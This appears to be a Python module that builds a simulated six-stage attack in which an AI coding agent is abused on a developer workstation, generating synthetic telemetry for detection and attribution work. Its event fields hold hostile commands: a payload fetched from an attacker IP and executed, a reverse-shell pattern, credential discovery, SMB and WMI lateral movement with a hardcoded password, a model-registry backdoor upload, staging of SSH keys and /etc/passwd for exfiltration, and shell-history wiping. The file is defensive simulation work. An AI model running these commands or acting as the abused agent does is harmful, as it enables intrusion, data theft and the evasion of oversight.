"""
场景二：AI智能体滥用行为检测与溯源
模拟攻击者利用LLM Agent (Claude Code, OpenCode等) 发起的攻击
检测AI Agent的异常行为模式，溯源AI技术栈的攻击路径
"""
from .scenario_base import AttackScenario


class AIAgentAbuseScenario(AttackScenario):
    """AI智能体滥用攻击场景"""

    def __init__(self):
        super().__init__(
            name="AI智能体滥用攻击 (GhostInTheMachine模式)",
            description="模拟攻击者利用Claude Code/OpenCode等LLM Agent进行自动化攻击: "
                        "AI驱动的自主侦察、代码生成攻击载荷、Agent工具链滥用、AI供应链攻击。",
            scenario_type="ai_agent_abuse"
        )
        self.attacker_ip = "198.51.100.50"         # AI威胁行为者C2 (区分于APT场景的198.51.100.50)
        self.c2_domain = "ai-threat-actor.net"     # AI攻击专用C2域名
        self.victim_dev = "10.10.20.100"           # 开发者工作站 (区分于APT场景的192.168.86.x)
        self.victim_server = "10.10.20.101"        # 受害AI服务器
        self.ai_registry = "10.10.20.10"           # AI模型注册表
        self.soc = "10.10.20.200"                  # SOC节点

    def generate_attack_sequence(self) -> list[dict]:
        stages = []

        # ============================
        # 阶段1: AI Agent接入与初始侦察
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段1: AI Agent接入与初始侦察",
            "description": "攻击者通过LLM Agent发起自动化侦察，AI代理explore-exploit循环模式",
            "events": [
                # AI Agent在开发者工作站上启动,执行侦察命令
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "claude", "pid": 21000, "parent_pid": 2000,
                              "parent_process": "terminal",
                              "command_line": "claude --dangerously-skip-permissions"},
                    features={"is_abnormal_parent": False}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "whoami", "pid": 21001, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "whoami && id && uname -a"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "explore_exploit_cycle",
                              "llm_generated": True}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "ifconfig", "pid": 21002, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "ifconfig -a && netstat -antp && ip route show"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "network_discovery",
                              "llm_generated": True}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "find", "pid": 21003, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "find / -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "credential_discovery",
                              "llm_generated": True}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "python3", "pid": 21004, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "python3 -c \"\n# AI-generated port scanner\nimport socket\nfor port in "
                                             "range(1,1024):\n    try:\n        s=socket.socket()\n        "
                                             "s.settimeout(0.1)\n        s.connect(('10.10.20.101',port))\n        "
                                             "print(f'Port {port} open')\n    except: pass\""},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "ai_generated_code",
                              "llm_generated": True,
                              "code_quality": "has_try_except_pass",
                              "has_llm_explanation": True}),
                self._make_event("network_traffic", self.victim_dev, "port_scan",
                    entities={"src_ip": self.victim_dev, "dst_ip": self.victim_server,
                              "scan_type": "sweep", "ports_scanned": list(range(1, 1024))},
                    extra={"src_ip": self.victim_dev, "dst_ip": self.victim_server, "protocol": "TCP"}),
            ]
        })

        # ============================
        # 阶段2: AI生成攻击载荷
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段2: AI生成攻击载荷 (AI-Generated Payloads)",
            "description": "LLM Agent生成恶意代码,包括反弹Shell、提权脚本、持久化载荷",
            "events": [
                self._make_event("host_behavior", self.victim_dev, "file_create",
                    entities={"process_name": "python3", "pid": 21004, "parent_pid": 21000,
                              "parent_process": "claude",
                              "file_path": "/tmp/ai_exploit.py", "file_name": "ai_exploit.py",
                              "command_line": ""},
                    features={"is_suspicious_extension": True,
                              "ai_pattern": "payload_generation",
                              "llm_generated": True}),
                self._make_event("host_behavior", self.victim_dev, "file_create",
                    entities={"process_name": "python3", "pid": 21004, "parent_pid": 21000,
                              "parent_process": "claude",
                              "file_path": "/tmp/reverse_shell.sh", "file_name": "reverse_shell.sh",
                              "command_line": ""},
                    features={"is_suspicious_extension": True,
                              "ai_pattern": "reverse_shell_generation",
                              "llm_generated": True,
                              "shell_pattern": "bash -i >& /dev/tcp"}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "chmod", "pid": 21005, "parent_pid": 21004,
                              "parent_process": "python3",
                              "command_line": "chmod +x /tmp/reverse_shell.sh /tmp/ai_exploit.py"},
                    features={"is_suspicious_cmd": True,
                              "ai_pattern": "permission_modification"}),
                # AI尝试多个载荷变体（试错行为）
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "python3", "pid": 21006, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "python3 /tmp/ai_exploit.py --target 10.10.20.101 --port 8080"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "trial_and_error",
                              "llm_generated": True,
                              "attempt": 1}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "python3", "pid": 21007, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "python3 /tmp/ai_exploit.py --target 10.10.20.101 --port 22 --method ssh"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "trial_and_error",
                              "llm_generated": True,
                              "attempt": 2,
                              "path_switching": True}),
            ]
        })

        # ============================
        # 阶段3: Agent工具链滥用
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段3: Agent工具链滥用 (Tool Abuse)",
            "description": "AI Agent滥用可用工具(curl/wget/python/bash)进行组合攻击",
            "events": [
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "curl", "pid": 21100, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "curl -s http://198.51.100.50/stage2.bin -o /tmp/stage2.bin"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "tool_abuse",
                              "tool_chain": ["curl", "wget", "python"]}),
                self._make_event("network_traffic", self.victim_dev, "network_flow",
                    entities={"src_ip": self.victim_dev, "dst_ip": self.attacker_ip,
                              "domain": "ai-agent-c2.net"},
                    extra={"src_ip": self.victim_dev, "dst_ip": self.attacker_ip, "dst_port": 80,
                           "protocol": "HTTP", "packet_length": 8192,
                           "user_agent": "Claude-Code/1.0"}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "base64", "pid": 21101, "parent_pid": 21100,
                              "parent_process": "curl",
                              "command_line": "base64 -d /tmp/stage2.bin > /tmp/stage2_decoded"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "encoding_decoding"}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "python3", "pid": 21102, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "python3 -c \"\n# LLM generated: decode and execute stage2\n"
                                             "import base64, subprocess, os\ndata = open('/tmp/stage2.bin').read()\n"
                                             "# Try base64 decode\ntry:\n    decoded = base64.b64decode(data)\n"
                                             "    with open('/tmp/stage2_elf','wb') as f: f.write(decoded)\n"
                                             "    os.chmod('/tmp/stage2_elf',0o755)\n"
                                             "    subprocess.Popen(['/tmp/stage2_elf'])\n"
                                             "except Exception as e:\n    print(f'Error: {e}')\""},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "ai_generated_code",
                              "llm_generated": True,
                              "has_llm_comments": True,
                              "has_try_except_pass": True}),
            ]
        })

        # ============================
        # 阶段4: 横向渗透 - AI探索内网
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段4: 横向渗透 (Lateral Movement via AI Agent)",
            "description": "AI Agent自主探索内网拓扑,尝试多种横向移动技术",
            "events": [
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "ssh", "pid": 21200, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
                                             "admin@10.10.20.101 'whoami && hostname'"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "lateral_exploration"}),
                self._make_event("host_log", self.victim_server, "user_logon",
                    entities={"user": "admin", "src_ip": self.victim_dev,
                              "session_id": "ssh-ai-001"}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "python3", "pid": 21201, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "python3 -c \"\n# AI-generated WMI lateral movement\n"
                                             "import subprocess\ncmd = 'wmic /node:10.10.20.10 /user:admin "
                                             "/password:Pass123! process call create cmd.exe'\n"
                                             "subprocess.run(cmd, shell=True)\""},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "ai_generated_code",
                              "llm_generated": True,
                              "hardcoded_credentials": True}),
                self._make_event("network_traffic", self.victim_dev, "network_flow",
                    entities={"src_ip": self.victim_dev, "dst_ip": self.victim_server},
                    extra={"src_ip": self.victim_dev, "dst_ip": self.victim_server, "dst_port": 22,
                           "protocol": "SSH", "packet_length": 500}),
                # AI尝试多个横向移动路径
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "python3", "pid": 21202, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "python3 -c \"\n# AI: trying smbclient for lateral movement\n"
                                             "import subprocess\n"
                                             "# Try SMB connection to DC\n"
                                             "subprocess.run(['smbclient','//10.10.20.10/C$',"
                                             "'-U','admin%Pass123!','-c','dir'])\n\""},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "path_switching",
                              "llm_generated": True,
                              "alternative_approach": True}),
            ]
        })

        # ============================
        # 阶段5: AI供应链攻击
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段5: AI供应链攻击 (AI Supply Chain)",
            "description": "攻击AI模型注册表,污染模型或窃取AI资产",
            "events": [
                self._make_event("network_traffic", self.victim_dev, "network_flow",
                    entities={"src_ip": self.victim_dev, "dst_ip": self.ai_registry},
                    extra={"src_ip": self.victim_dev, "dst_ip": self.ai_registry, "dst_port": 5000,
                           "protocol": "HTTP", "packet_length": 2048,
                           "event_type": "network_flow"}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "python3", "pid": 21300, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "python3 -c \"\n# AI: probing AI model registry\n"
                                             "import requests\n"
                                             "r = requests.get('http://10.10.20.10:5000/api/models')\n"
                                             "print(r.json())\n\""},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "ai_supply_chain",
                              "targeting_ai_infra": True,
                              "llm_generated": True}),
                self._make_event("host_behavior", self.victim_dev, "file_create",
                    entities={"process_name": "python3", "pid": 21300, "parent_pid": 21000,
                              "parent_process": "claude",
                              "file_path": "/tmp/model_backdoor.py", "file_name": "model_backdoor.py",
                              "command_line": ""},
                    features={"is_suspicious_extension": True,
                              "ai_pattern": "model_poisoning",
                              "supply_chain_attack": True,
                              "llm_generated": True}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "curl", "pid": 21301, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "curl -X POST http://10.10.20.10:5000/api/models/upload "
                                             "-F 'file=@/tmp/model_backdoor.py' -H 'X-AI-Agent: Claude-Code/1.0'"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "model_upload",
                              "supply_chain_attack": True}),
            ]
        })

        # ============================
        # 阶段6: 数据外传与清理
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段6: 数据外传与痕迹清理",
            "description": "AI Agent打包窃取的数据并通过AI基础设施外传",
            "events": [
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "tar", "pid": 21400, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "tar -czf /tmp/exfil_$(date +%s).tar.gz /tmp/ai_exploit.py "
                                             "/home/user/.ssh /etc/passwd /tmp/stage2_elf"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "data_staging"}),
                self._make_event("network_traffic", self.victim_dev, "data_exfiltration",
                    entities={"src_ip": self.victim_dev, "dst_ip": self.attacker_ip},
                    extra={"src_ip": self.victim_dev, "dst_ip": self.attacker_ip, "dst_port": 443,
                           "protocol": "HTTPS", "packet_length": 50000,
                           "event_type": "data_exfiltration",
                           "user_agent": "OpenCode-Agent/2.0"}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "rm", "pid": 21401, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "rm -rf /tmp/ai_exploit.py /tmp/reverse_shell.sh "
                                             "/tmp/stage2* /tmp/exfil_*.tar.gz /tmp/model_backdoor.py"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "cleanup"}),
                self._make_event("host_behavior", self.victim_dev, "process_create",
                    entities={"process_name": "history", "pid": 21402, "parent_pid": 21000,
                              "parent_process": "claude",
                              "command_line": "history -c && rm -f ~/.bash_history ~/.zsh_history"},
                    features={"is_abnormal_parent": True,
                              "ai_pattern": "log_clearing"}),
            ]
        })

        return stages
